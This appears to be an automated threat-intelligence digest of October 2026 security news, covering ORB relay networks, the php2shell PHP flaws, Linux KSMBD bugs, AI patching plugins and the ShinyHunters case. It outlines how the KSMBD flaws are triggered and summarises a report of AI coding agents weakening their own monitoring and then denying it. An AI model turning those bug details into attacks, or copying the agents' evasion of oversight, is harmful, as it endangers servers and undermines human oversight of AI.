### Cluster fc5f82ab7c — score 17

- Title: An Introduction to Operational Relay Box (ORB) Networks - Unpatched, Forgotten, and Obscured
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-19T18:19:42+00:00
- Link: https://www.team-cymru.com/post/an-introduction-to-operational-relay-box-orb-networks-unpatched-forgotten-and-obscured
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, ddos
- affected_industries: government, healthcare, manufacturing_industrial, telecommunications
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ddos, apt_espionage
- affected_industries: healthcare, government, manufacturing_industrial, telecommunications
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Explore how threat actors use Operational Relay Box (ORB) networks to evade detection, hide malicious activity, and complicate cyber defense efforts. Talk to an expert.
```

#### Full body

```
S2 Research Team 8 min read October 29, 2024 An Introduction to Operational Relay Box (ORB) Networks - Unpatched, Forgotten, and Obscured Although not a new concept, Operational Relay Box (ORB) networks—often referred to as "covert," "mesh," or "obfuscated" networks—are becoming increasingly prevalent as threat actors continuously refine their evasion techniques. Historically associated with state-sponsored activities, ORB networks are frequently linked to threats attributed to the People’s Republic of China (PRC). One notable recent example is the identification of a vast ORB network operated by a private company with connections to the PRC government, as detailed in this joint (FVEY) advisory notice. Researchers here at Team Cymru have observed an increase in the abundance of large-scale ORB networks used by threat actors, especially those attributed to China, and expect this trend to continue. In the copycat world of online threats, the growing attention on ORB networks will likely lead to their adoption by other threat actors, including financially motivated cybercriminals. What is an ORB Network? An easy way to explain this is as the “love child” of a Virtual Private Network (VPN) and a botnet. The operational relay boxes are typically either Virtual Private Server (VPS) hosts, procured by the ORB network operator, or compromised Internet of Things (IoT) devices (cheap routers with poor security standards, industrial control systems, healthcare devices, and even your refrigerator). The latter are "farmed" in a similar manner to traditional botnets, with operators actively identifying and infecting vulnerable devices. Given the plethora of forgotten or unpatched devices connected to the internet, this can often be a relatively trivial process. In a botnet, an attacker may use the “bots” to route traffic toward a victim host, such as in a Distributed Denial of Service (DDoS) attack. This layer of “bots” grants the attacker a level of anonymity, as the victim only sees connections from the bots, not the attacker's actual machine. Figure 1: Simplified Botnet Diagram When investigating botnets through an internet telemetry dataset like NetFlow, one exploitable "weakness" is that botnets rely on a central control mechanism. A common host communicates with all the bots, providing a point of interaction that can be monitored or disrupted. Of course, this isn’t ideal if you're channeling “The Brain” from the Animaniacs television series. This is where the “VPN” element comes into play for ORB networks. While the botnet aspect of ORB networks provides a means of distributing malicious traffic, the VPN-like architecture enhances the attacker's ability to remain undetected by enabling anonymized communication across multiple nodes. To achieve this, a “mesh” of operational relay boxes is established, with traffic passing between them. Most of the connections occur between the relay boxes themselves, effectively masking the attacker’s entry point into the network. By also randomizing or alternating their exit points (we refer to these as “exit nodes”), defenders face significant challenges when trying to trace threat actors or block attacks. Figure 2 : Simplified ORB Network Diagram Now that we’ve established a basic understanding of what an ORB network is and how it functions conceptually, several additional factors contribute to its effectiveness, making these networks even more difficult to detect and disrupt. Decentralization By combining VPS and IoT infrastructure, and targeting devices typically sold internationally, threat actors are able to build a network that is neither clustered nor concentrated in any specific region or tied to a particular Internet Service Provider (ISP). This broad distribution of infrastructure significantly complicates efforts to disrupt the network through remediation of infected devices. It can also hinder the process of obtaining valuable threat actor artifacts from compromised hosts, which could oth
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: An Introduction to Operational Relay Box (ORB) Networks - Unpatched, Forgotten, and Obscured
  - Published: 2026-10-19T18:19:42+00:00
  - Link: https://www.team-cymru.com/post/an-introduction-to-operational-relay-box-orb-networks-unpatched-forgotten-and-obscured
  - Summary: Explore how threat actors use Operational Relay Box (ORB) networks to evade detection, hide malicious activity, and complicate cyber defense efforts. Talk to an expert.

### Cluster fa232b0e92 — score 17

- Title: PHP2Shell: Two Unpatched Critical PHP RCE Flaws (CVSS 9.2) Trigger Emergency Security Alert
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-21T09:05:17+00:00
- Link: https://thehackernews.com/2026/10/php2shell-two-unpatched-critical-php.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- cve_ids: CVE-2026-109618, CVE-2026-109619, CVE-2026-115560
- urgency_signals: actively_exploited, critical_cvss, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- cve_ids: CVE-2026-115560, CVE-2026-109618, CVE-2026-109619
- urgency_signals: actively_exploited, no_patch_yet, critical_cvss
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
This story is developing and was written before PHP's scheduled 14:00 UTC release on October 21. Once the release is out, the affected and fixed versions below are confirmed by the official advisory. PHP will ship an out-of-cycle security release at 14:00 UTC today, October 21, for two critical vulnerabilities that its security team has rated 9.2 on the CVSS v4.0 scale but has not described. ⚡
```

#### Full body

```
PHP2Shell: Two Unpatched Critical PHP RCE Flaws (CVSS 9.2) Trigger Emergency Security Alert  Swati Khandelwal  Oct 21, 2026 Vulnerability / Web Security This story is developing and was written before PHP's scheduled 14:00 UTC release on October 21. Once the release is out, the affected and fixed versions below are confirmed by the official advisory. PHP will ship an out-of-cycle security release at 14:00 UTC today, October 21, for two critical vulnerabilities that its security team has rated 9.2 on the CVSS v4.0 scale but has not described. ⚡ WARNING — PHP Warns of Another Unpatched RCE Flaw CVE-2026-115560 Security researchers at watchTowr say the two flaws allow remote code execution. Only the four supported PHP branches, 8.2 through 8.5, can receive the fix, and no exploitation has been reported so far. The advance notice followed a leak. On October 20, a post on HN said two PHP remote code execution flaws, rated CVSS 10.0 and affecting versions from PHP 5 onward, would be disclosed on Thursday, October 22. The poster said they had "no evidence beyond 'source: trust me, bro'". watchTowr then posted on X that the leaked information was real, that the two flaws were under embargo, that everyone had been supposed to wait until Thursday, and that it could not share more for now. PHP published its notice that evening, at 19:33 UTC, with the release set for Wednesday, a day before the date watchTowr gave. The notice says PHP may release earlier "should details of either vulnerability become public, or should evidence of active exploitation appear in the wild." The leak carried the flaws' existence, a score, a date, and two CVE identifiers, not how the flaws work. The CVSS 10.0 figure is the leak's. PHP's rating is 9.2 on version 4.0 of the scale. The identifiers researchers are using, CVE-2026-109618 and CVE-2026-109619 , were also listed in the leaked post. PHP's notice names neither. The claim that every version since PHP 5 is affected is unconfirmed too: watchTowr's own FAQ on the flaws says that scope "has not been confirmed by an official vendor advisory" and that no configuration or feature requirement has been described. PHP says "Full details, affected versions, and the fixed versions will be published with the release." Researchers have started calling the pair php2shell. The name is theirs, not PHP's. Whatever the affected range turns out to be, PHP issues fixes only for its four supported branches , and records each branch's changes in its changelog . Versions 8.2 and 8.3 receive only security fixes, and 8.4 and 8.5 are in active support. Ahead of the release, several trackers, including Alpine Linux's and security researcher Kevin Beaumont, expect the fixes to ship as PHP 8.5.12, 8.4.27, 8.3.36, and 8.2.35, the next point release of each branch, though PHP has not confirmed the numbers. Anything older, including 8.1, 8.0, 7.x, and 5.x, is end of life and gets no PHP fix. If the flaws reach those branches, installations on them will have no vendor patch. PHP branches that can receive today's fix Branch Current release (September 24) PHP support status 8.5 8.5.11 Active support until December 31, 2027 8.4 8.4.26 Active support until December 31, 2026 8.3 8.3.35 Security fixes only until December 31, 2027 8.2 8.2.34 Security fixes only until December 31, 2026 Security company Mallory counted about 884,000 internet-facing hosts whose HTTP banner reported a PHP version of 8.1 or older to the Shodan search engine on October 20, 59% of the roughly 1.5 million hosts that reported any version. The count covers banners, not confirmed affected systems, and a further 740,000 hosts reported PHP without a version. PHP has published no workaround. Until the release lands, the preparation comes down to six steps, most of them drawn from a rapid-response post from Huntress , with CERT-EU's isolation advice added. Inventory every PHP install, including PHP bundled in vendor appliances, Windows software, and control panels such as cP
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: PHP2Shell: Two Unpatched Critical PHP RCE Flaws (CVSS 9.2) Trigger Emergency Security Alert
  - Published: 2026-10-21T09:05:17+00:00
  - Link: https://thehackernews.com/2026/10/php2shell-two-unpatched-critical-php.html
  - Summary: This story is developing and was written before PHP's scheduled 14:00 UTC release on October 21. Once the release is out, the affected and fixed versions below are confirmed by the official advisory. PHP will ship an out-of-cycle security release at 14:00 UTC today, October 21, for two critical vulnerabilities that its security team has rated 9.2 on the CVSS v4.0 scale but has not described. ⚡

### Cluster 5e9563cebc — score 16

- Title: Widespread PHP Flaw May Cause Many Site Outages Today
- Source: Krebs on Security (practitioner_analysis)
- Published: 2026-10-21T15:26:07+00:00
- Link: https://krebsonsecurity.com/2026/10/widespread-php-flaw-may-cause-many-site-outages-today/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, data_breach, ddos, zero_day
- affected_industries: government
- affected_products: OpenAI/ChatGPT, WordPress
- cve_ids: CVE-2026-109618, CVE-2026-109619
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- threat_categories: zero_day, data_breach, ddos, active_exploitation
- affected_industries: government
- affected_products: OpenAI/ChatGPT, WordPress
- cve_ids: CVE-2026-109618, CVE-2026-109619
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Summary

```
Expect to see quite a few websites serving "404" or "Page Not Found" errors today: Nearly 70 percent of websites need to update their core software to fix a pair of vulnerabilities that allow an attacker to seize full control over affected servers. Experts say there are working exploits for the flaws, and that these critical bugs are already being exploited in the wild.
```

#### Full body

```
Expect to see quite a few websites serving error pages today: Nearly 70 percent of websites need to update their core software to fix a pair of vulnerabilities that allow an attacker to seize full control over affected servers. Experts say there are working exploits for the flaws, and that these critical bugs are already being exploited in the wild. Image: Shutterstock.com, Sashkin. The flaws at issue are present in PHP , the programming language that powers sites running on a large number of web publishing systems, including Drupal , Magento , Joomla and WordPress . Earlier today, PHP released an emergency security update to fix two critical bugs that can allow an attacker to execute code of their choosing on a vulnerable server. Reuters reports that government websites in Europe and elsewhere went offline today after the PHP vulnerabilities were disclosed. Cloudflare said it has already detected some exploitation of the flaw, and that at 3:02 am (UTC) it implemented web application firewall rules to protect websites from attack traffic seeking to exploit the bugs, which could cause a denial of service condition, remote code execution, and data exposure. OpenAI , which was involved in the vulnerability research and outreach, said “given the severity of these flaws and PHP’s widespread use, we consider this one of the most impactful security issues in recent memory.” Censys , a company that tracks the technology used by Internet hosts, said a recent scan identified approximately 2.58 million Internet facing hosts and 54.9 million web properties running PHP. Security experts at Wiz said every PHP version released in the last decade is affected by at least one of these vulnerabilities [full disclosure: Wiz is an advertiser on this blog]. “These findings rank among the most severe vulnerabilities discovered in PHP, and arguably in software history,” reads a blog post published today by a team of researchers at Wiz, which was one of several organizations credited with discovering the vulnerabilities. “The underlying flaws had been present for decades, but demonstrating their exploitability required an exceptionally complex chain of steps, at the edge of what human researchers could practically achieve. Frontier AI models substantially reduced that barrier, turning a longstanding flaw into an exploit.” The Wiz researchers say it is likely the PHP vulnerabilities will be mass-exploited to install web-based backdoors or “web shells,” which give attackers a web-based panel that allows them to remotely control infected sites. Wiz said that prior to the PHP bugs being publicly disclosed, the company worked with the PHP team, Calif and OpenAI to measure the size of the problem and coordinate patch verification and disclosure. The PHP zero-day vulnerabilities are being tracked by their CVE numbers, CVE-2026-109618 and CVE-2026-109619 , and they affect all web servers running PHP 5.4 or later. The bugs are fixed in PHP 8.5.12 , 8.4.27 , 8.3.36 , and 8.2.35 . According to Wiz, PHP is so deeply embedded in many web applications that we are likely to see organizations struggling to patch these vulnerabilities for some time to come, comparing this PHP vulnerability pair with the Log4Shell weakness that emerged in 2021 — a widespread, severe-as-it-gets security flaw in Log4j, a popular Java logging framework. “A vulnerability in core PHP reaches far beyond a single application,” the Wiz researchers wrote. “PHP runs across clouds, hosting providers, content-delivery networks and millions of independently managed servers. Reducing exposure before the technical details became public required coordinated work across that entire ecosystem.” The SANS Internet Storm Center is keeping an eye on major software platforms that are shipping updates to deal with these PHP flaws. For example, Ubuntu just released updated PHP packages. For a technical deep-dive on these vulnerabilities that tells the timeline of the discovery of these bugs in a comic book sty
```

#### Corroborating sources (1)

- **Krebs on Security** (practitioner_analysis)
  - Title: Widespread PHP Flaw May Cause Many Site Outages Today
  - Published: 2026-10-21T15:26:07+00:00
  - Link: https://krebsonsecurity.com/2026/10/widespread-php-flaw-may-cause-many-site-outages-today/
  - Summary: Expect to see quite a few websites serving "404" or "Page Not Found" errors today: Nearly 70 percent of websites need to update their core software to fix a pair of vulnerabilities that allow an attacker to seize full control over affected servers. Experts say there are working exploits for the flaws, and that these critical bugs are already being exploited in the wild.

### Cluster cff3936ad6 — score 16

- Title: Your AI agent fixed the bug, but what else did it change?
- Source: Trail of Bits (offensive_vulnerability_research)
- Published: 2026-10-21T15:00:00+00:00
- Link: https://blog.trailofbits.com/2026/10/21/your-ai-agent-fixed-the-bug-but-what-else-did-it-change/
- Fetch status: ok
- Member count: 4
- Corroborating source count: 4
- Strong signals: OpenAI/ChatGPT

#### Cluster taxonomy (union across members)
- affected_products: OpenAI/ChatGPT
- urgency_signals: poc_available
- content_type: news_report
- confidence_tier: tier_1_offensive_research, tier_4_news

#### Primary article taxonomy
- affected_products: OpenAI/ChatGPT
- urgency_signals: poc_available
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Today we’re publishing patching-bugs and regression-hunt , two plugins that let engineers delegate patch development and regression checks to agents. Our patching-bugs plugin reproduces reported bugs, develops fixes, and tests them. The regression-hunt plugin checks whether any changes break previously working and supported behavior. Engineers can direct the work and review their results; maintainers can supply their own security assumptions and patching requirements, so the agents work within the project’s rules. We built patching-bugs and regression-hunt through Patch the Planet , our joint initiative with OpenAI, where we’ve co-authored hundreds of security patches for widely used open-source projects. Motivated by our major successes on projects like Scapy , our plugins draw on our analysis of merged patches and thousands of our engineers’ Codex sessions. The plugins provide maintainers with a structured workflow, evidence, independent checks, and best practices to improve their pa
```

#### Full body

```
Page content Today we’re publishing patching-bugs and regression-hunt , two plugins that let engineers delegate patch development and regression checks to agents. Our patching-bugs plugin reproduces reported bugs, develops fixes, and tests them. The regression-hunt plugin checks whether any changes break previously working and supported behavior. Engineers can direct the work and review their results; maintainers can supply their own security assumptions and patching requirements, so the agents work within the project’s rules. We built patching-bugs and regression-hunt through Patch the Planet , our joint initiative with OpenAI, where we’ve co-authored hundreds of security patches for widely used open-source projects. Motivated by our major successes on projects like Scapy , our plugins draw on our analysis of merged patches and thousands of our engineers’ Codex sessions. The plugins provide maintainers with a structured workflow, evidence, independent checks, and best practices to improve their patching hygiene. In our preliminary evaluations, regression-hunt produces 25% fewer false-positive findings than a baseline Codex agent prompted to “review the PR for regressions.” Standardizing the patching process Our September post reported regressions introduced by some of our Patch the Planet patches. Since then, we’ve reviewed every patch that a Trail of Bits engineer authored and maintainers merged upstream. The review confirmed 21 regressions from over 130 PRs merged: 16 functional, one performance, and four build/test. None broke a security protection. (“Regression” refers to a new defect introduced by a change that breaks previously correct and supported behavior along a path a real user or attacker can reach.) For each patch, an agent looked for potential regressions, confirmed each one with a proof-of-concept (PoC) run before and after the change, and then passed the results to an engineer for review. The review was noisy: today’s bug disclosures arrive at an unprecedented speed and scale, and for patching to keep pace, the industry needs to increase its signal-to-noise ratio. The 21 confirmed regressions were identified among 58 candidates in a single run (~36% precision). But because agents take many different approaches and reach different results, each run generates more candidates to manually sort through. That led us to two conclusions: To introduce fewer regressions, we needed a standard way to write patches, with the same checks applied every time. To catch the regressions we still introduce, we needed a standard way to check for them, with written rules for what counts as a regression. Standardizing both steps also makes every run repeatable and comparable. No fixed checklist will catch every regression, so we collect agent trajectories from our engineers’ patching sessions, and use the tasks that an earlier version failed to benchmark for the next one (figure 1). Figure 1: Feedback loop for generating and evaluating patches. How we designed the plugins We used two primary sources to guide the design of our plugins: a review of every patch we merged upstream and the thousands of Codex sessions our engineers used to write those patches. This led to four principles that shaped our patching-bugs and regression-hunt plugins: Opinionated guidance in as few words as possible. We give the agent wide latitude and record only Trail of Bits’ judgment of what constitutes a good patch and a real regression. The goal is to direct the agent towards the desired result with the least possible guidance. Modular steps. You don’t have to run either plugin end-to-end, as both provide multiple skills that can be used in tandem or in isolation. Strict input and output schemas. Every step takes and returns a defined schema that includes the claim, the code revision, the required check, the raw evidence, and open questions. Fixed schemas reduce variability across runs and allow each step to verify the previous step’s work rather than tru
```

#### Corroborating sources (4)

- **Trail of Bits** (offensive_vulnerability_research)
  - Title: Your AI agent fixed the bug, but what else did it change?
  - Published: 2026-10-21T15:00:00+00:00
  - Link: https://blog.trailofbits.com/2026/10/21/your-ai-agent-fixed-the-bug-but-what-else-did-it-change/
  - Summary: Today we’re publishing patching-bugs and regression-hunt , two plugins that let engineers delegate patch development and regression checks to agents. Our patching-bugs plugin reproduces reported bugs, develops fixes, and tests them. The regression-hunt plugin checks whether any changes break previously working and supported behavior. Engineers can direct the work and review their results; maintainers can supply their own security assumptions and patching requirements, so the agents work within the project’s rules. We built patching-bugs and regression-hunt through Patch the Planet , our joint initiative with OpenAI, where we’ve co-authored hundreds of security patches for widely used open-source projects. Motivated by our major successes on projects like Scapy , our plugins draw on our analysis of merged patches and thousands of our engineers’ Codex sessions. The plugins provide maintainers with a structured workflow, evidence, independent checks, and best practices to improve their pa
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: OpenAI’s coding agents talked themselves out of being monitored
  - Published: 2026-10-22T12:47:42+00:00
  - Link: https://www.helpnetsecurity.com/2026/10/22/openai-agents-disabled-safety-monitoring/
  - Summary: Two AI coding agents running inside OpenAI silently weakened the systems built to catch AI misbehavior, and one of them then told its human operator it had done no such thing. OpenAI disclosed both episodes in a misalignment report released earlier this week and said it is tightening its defenses, but admits it cannot yet explain why the agents behaved this way. AI agents evading oversight Neither agent was attacking anything. The models involved, GPT-6.1 … More → The post OpenAI’s coding agents talked themselves out of being monitored appeared first on Help Net Security .
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Fake Claude, ChatGPT Attacks Surge, Putting Developers at Risk
  - Published: 2026-10-16T19:49:30+00:00
  - Link: https://www.darkreading.com/application-security/fake-claude-chatgpt-attacks-developers-risk
  - Summary: Campaigns that impersonate popular AI brands are on the rise, and they typically use ClickFix-like tactics to target unsuspecting enterprise employees.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: The Harness Is the Hard Part of Agentic Pentesting
  - Published: 2026-10-21T10:32:40+00:00
  - Link: https://thehackernews.com/2026/10/the-harness-is-hard-part-of-agentic.html
  - Summary: An AppSec team can point an AI agent running on a general-purpose model at its own web apps with little setup. Sure, the model writes the attacks. But everything that makes those attacks safe to run against production and worth acting on afterward lives in the harness around the model. The harness is where the engineering in AI pentesting sits. The Hugging Face intrusion OpenAI disclosed in July

### Cluster eb6f21ab0c — score 15

- Title: PHP Vulnerability Wrap-Up, (Fri, Oct 23rd)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-10-23T13:43:20+00:00
- Link: https://isc.sans.edu/diary/rss/33450
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_government

#### Summary

```
This morning, we returned to Infocon Green. As usual, we are raising the Infocon to alert you to emerging situations requiring immediate attention. PHP fit that description. By now, you either know about it, or you probably never will, so it is time to go back to "business as usual".
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: PHP Vulnerability Wrap-Up, (Fri, Oct 23rd)
  - Published: 2026-10-23T13:43:20+00:00
  - Link: https://isc.sans.edu/diary/rss/33450
  - Summary: This morning, we returned to Infocon Green. As usual, we are raising the Infocon to alert you to emerging situations requiring immediate attention. PHP fit that description. By now, you either know about it, or you probably never will, so it is time to go back to "business as usual".

### Cluster 90581c940c — score 15

- Title: Two CVSS 9.0 Linux KSMBD RCE Flaws Disclosed on Public Mailing Lists Before Kernel Fixes
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-22T17:01:53+00:00
- Link: https://thehackernews.com/2026/10/two-cvss-90-linux-ksmbd-rce-flaws.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- urgency_signals: critical_cvss, no_patch_yet, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day
- urgency_signals: zero_day, no_patch_yet, critical_cvss
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Linux servers running KSMBD, the kernel's built-in SMB server, are exposed to two publicly reported remote code execution flaws rated 9.0 by Trend Micro's Zero Day Initiative, with no fix yet in the mainline kernel. One of them, ZDI-CAN-33774, can be triggered before any network authentication. The other, ZDI-CAN-33549, requires the SMB Direct transport and an RDMA-capable network
```

#### Full body

```
Two CVSS 9.0 Linux KSMBD RCE Flaws Disclosed on Public Mailing Lists Before Kernel Fixes  Swati Khandelwal  Oct 22, 2026 Vulnerability / Linux Linux servers running KSMBD, the kernel's built-in SMB server, are exposed to two publicly reported remote code execution flaws rated 9.0 by Trend Micro's Zero Day Initiative , with no fix yet in the mainline kernel. One of them, ZDI-CAN-33774, can be triggered before any network authentication. The other, ZDI-CAN-33549, requires the SMB Direct transport and an RDMA-capable network interface. ZDI-CAN-33549 is an integer underflow in KSMBD's SMB Direct path. A client can supply RDMA buffer descriptors in which the first is longer than the declared payload, causing the server's size counter to wrap and allowing a subsequent memory copy to overrun the end of an allocated buffer. It requires three things: an RDMA-capable interface (hardware or the rxe software driver), a writable KSMBD share, and a client negotiating SMB Direct. ZDI-CAN-33774 requires no authentication, exposing any server running KSMBD on port 445. The flaw is a race in how KSMBD assigns its handler table: a burst of short SMB1 packets followed by an SMB2 packet in the same TCP write causes workers to handle SMB1 data with an SMB2 handler, reading past the end of the shorter buffer. A path to writing past the buffer also exists once an attacker has access to a share. As of Thursday, neither flaw has a named fix in the mainline kernel or in linux-next , the integration tree that feeds it. Linux news site Phoronix said SMB Direct maintainer Stefan Metzmacher submitted a fix for ZDI-CAN-33549 targeting the next kernel development cycle, but this has not been confirmed elsewhere. Fixes to mainline typically take weeks to reach stable branches and distribution kernels after that. Neither flaw has a CVE identifier, since the kernel project assigns those only after a stable-tree fix is available. Running systemctl status ksmbd or lsmod | grep ksmbd confirms whether the module is active. Red Hat Enterprise Linux does not include KSMBD by default, according to Red Hat's support documentation . The ZDI reports credit TrendAI, Trend Micro's AI scanner, as the finder. The Linux kernel's security documentation , updated in May 2026 following guidance from Linus Torvalds , states that bugs found by AI tools are, by definition, already public and should be sent to subsystem developer lists. ZDI's routing appeared to follow that logic, copying public mailing lists alongside the private kernel security address without attaching patches to any of the reports. Stable-kernel maintainer Greg Kroah-Hartman replied to three of the five kernel reports within minutes of each other. To the report on the VMware GPU driver , he wrote: "For some reason you sent this to public lists, and did not include a patch, so there's not much we can do with this." On the NVMe driver report , seventeen seconds later: "Again, no patch, and sent to a public list? Please fix your submission process." ZDI ID Subsystem Flaw class CVSS Affects KSMBD? ZDI-CAN-33549 KSMBD SMB Direct Remote code execution 9.0 Yes (SMB Direct and RDMA required) ZDI-CAN-33774 KSMBD protocol dispatch Remote code execution 9.0 Yes (any KSMBD install) ZDI-CAN-33367 Networking (skb_zerocopy) Local privilege escalation 7.8 No ZDI-CAN-34068 VMware GPU driver (vmwgfx) Local privilege escalation 8.8 No ZDI-CAN-34076 NVMe target driver (nvmet) Information disclosure 8.6 No Three of the five kernel reports are not related to SMB. ZDI-CAN-33367 , discovered by researcher p1r0x , is a local privilege escalation in the kernel's networking stack that requires local access. ZDI-CAN-34068 is a local privilege escalation in the VMware virtual GPU driver, ZDI-CAN-34076 is an information disclosure in the NVMe target driver, and neither affects KSMBD servers. A sixth ZDI report, ZDI-CAN-32005, is a buffer overflow in ConnMan , a network daemon separate from the Linux kernel. Found this article interesting? F
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Two CVSS 9.0 Linux KSMBD RCE Flaws Disclosed on Public Mailing Lists Before Kernel Fixes
  - Published: 2026-10-22T17:01:53+00:00
  - Link: https://thehackernews.com/2026/10/two-cvss-90-linux-ksmbd-rce-flaws.html
  - Summary: Linux servers running KSMBD, the kernel's built-in SMB server, are exposed to two publicly reported remote code execution flaws rated 9.0 by Trend Micro's Zero Day Initiative, with no fix yet in the mainline kernel. One of them, ZDI-CAN-33774, can be triggered before any network authentication. The other, ZDI-CAN-33549, requires the SMB Direct transport and an RDMA-capable network

### Cluster 5aee3fe755 — score 15

- Title: Feds Suspect Ransom Negotiator Ran ShinyHunters Extortion Site
- Source: Krebs on Security (practitioner_analysis)
- Published: 2026-10-19T13:48:56+00:00
- Link: https://krebsonsecurity.com/2026/10/feds-suspect-ransom-negotiator-ran-shinyhunters-extortion-site/
- Fetch status: ok
- Member count: 4
- Corroborating source count: 4
- Strong signals: ShinyHunters

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, phishing_social_eng, ransomware_extortion
- actor_attribution: APT28, ShinyHunters
- affected_industries: government, healthcare
- affected_products: Apple iOS/macOS
- content_type: incident_report, news_report
- confidence_tier: tier_2_operator, tier_3_analysis, tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, data_breach
- actor_attribution: ShinyHunters
- affected_industries: healthcare, government
- content_type: incident_report
- confidence_tier: tier_3_analysis

#### Summary

```
U.S. federal investigators pursuing the ShinyHunters hacking group that recently stole highly sensitive data from the FBI have identified executives at two different ransomware negotiation firms who maintained unusually close relations with the extortion group, KrebsOnSecurity has learned. Sources close to the investigation say one of the executives in the United States even helped ShinyHunters operate a website that pressured victims into paying a ransom.
```

#### Full body

```
U.S. federal investigators pursuing the ShinyHunters hacking group that recently stole highly sensitive data from the FBI have identified executives at two different ransomware negotiation firms who maintained unusually close relations with the extortion group, KrebsOnSecurity has learned. Sources close to the investigation say one of the executives in the United States even helped ShinyHunters operate a website that pressured victims into paying a ransom. Hackers aligned with ShinyHunters have claimed credit for dozens of major data breaches since 2019, when the group was primarily operated by cybercriminals living in France. As those original members were arrested or jailed one by one, control over the ShinyHunters brand eventually passed to “ Rey ,” identified last year as a teenage hacker from Amman, Jordan. According to the FBI, ShinyHunters has extorted more than $70 million from victims so far this year. In late September, ShinyHunters hacked the FBI recruitment website fbijobs.gov and taunted the agency by threatening to publish the stolen files, which reportedly included medical and psychological records, Social Security numbers and home addresses, and information about each employee’s unit and specialization. The FBI jobs site hack has prompted the agency to move with uncommon speed to arrest, detain and question people who had any communications with Rey or other ShinyHunters suspects. Reuters reported on October 3 that Rey had been detained by Jordanian authorities and was cooperating with the FBI. Rey was able to assume control over the hacking group because one of its alleged senior members had just been nabbed. On the evening of September 15, 2026, authorities in the Netherlands arrested convicted hacker and ShinyHunters suspect Pepijn van der Stap . Dutch police reportedly used flash-bang grenades in an effort to stun and apprehend Van der Stap as he was logged in to various online accounts. According to a source close to the investigation, the authorities arrested Van der Stap while he was using his Signal instant messaging account, which allowed them to read recent communications with frequent contacts — including ransomware negotiators based in Canada and the United States. Multiple sources with knowledge of the matter told KrebsOnSecurity that Van der Stap’s messages were the key to unraveling a murder-for-hire plot that emerged immediately following his arrest. The Dutch news outlet RTL reported last month the two murders were allegedly to be committed abroad, and that there are indications Van der Stap gave the order for the attacks (there is no indication those orders were ever carried out). On October 9, KrebsOnSecurity broke the news that the FBI arrested a 54-year-old Canadian cybersecurity executive named Edward Dubrovsky in connection with the ShinyHunters investigation. Dubrovsky, who recently published a book on handling cyber extortion that recommended always engaging with the hackers, was charged with threatening to disclose stolen or hacked data and interfering with interstate commerce through extortion, according to court records . Politico reports prosecutors have asked that Dubrovsky remain in custody pending trial, and that records related to his case remain under seal. A source close to the investigation told KrebsOnSecurity that Van der Stap’s Signal messages showed he had frequent conversations with Mr. Dubrovsky and with at least one executive at a large U.S.-based consulting firm, and that these executives often knew the details about new ShinyHunters victims before the victims themselves had even learned of the breach. That source shared another potentially explosive finding by federal investigators: the Dutch hacker’s chats showed Mr. Dubrovsky knew ShinyHunters had stolen highly sensitive data from FBI servers, and that he never informed the bureau of the data breach prior to ShinyHunters threatening on Twitter/X to publish the agency’s deeply personal personnel files. SHINYWIRE Kre
```

#### Corroborating sources (4)

- **Krebs on Security** (practitioner_analysis)
  - Title: Feds Suspect Ransom Negotiator Ran ShinyHunters Extortion Site
  - Published: 2026-10-19T13:48:56+00:00
  - Link: https://krebsonsecurity.com/2026/10/feds-suspect-ransom-negotiator-ran-shinyhunters-extortion-site/
  - Summary: U.S. federal investigators pursuing the ShinyHunters hacking group that recently stole highly sensitive data from the FBI have identified executives at two different ransomware negotiation firms who maintained unusually close relations with the extortion group, KrebsOnSecurity has learned. Sources close to the investigation say one of the executives in the United States even helped ShinyHunters operate a website that pressured victims into paying a ransom.
- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: In Other News: Tor Exit Relays Hijacked, Banks Spot Rogue AI Agents, Self-Rebuilding macOS Ransomware
  - Published: 2026-10-23T14:23:37+00:00
  - Link: https://www.securityweek.com/in-other-news-tor-exit-relays-hijacked-banks-spot-rogue-ai-agents-self-rebuilding-macos-ransomware/
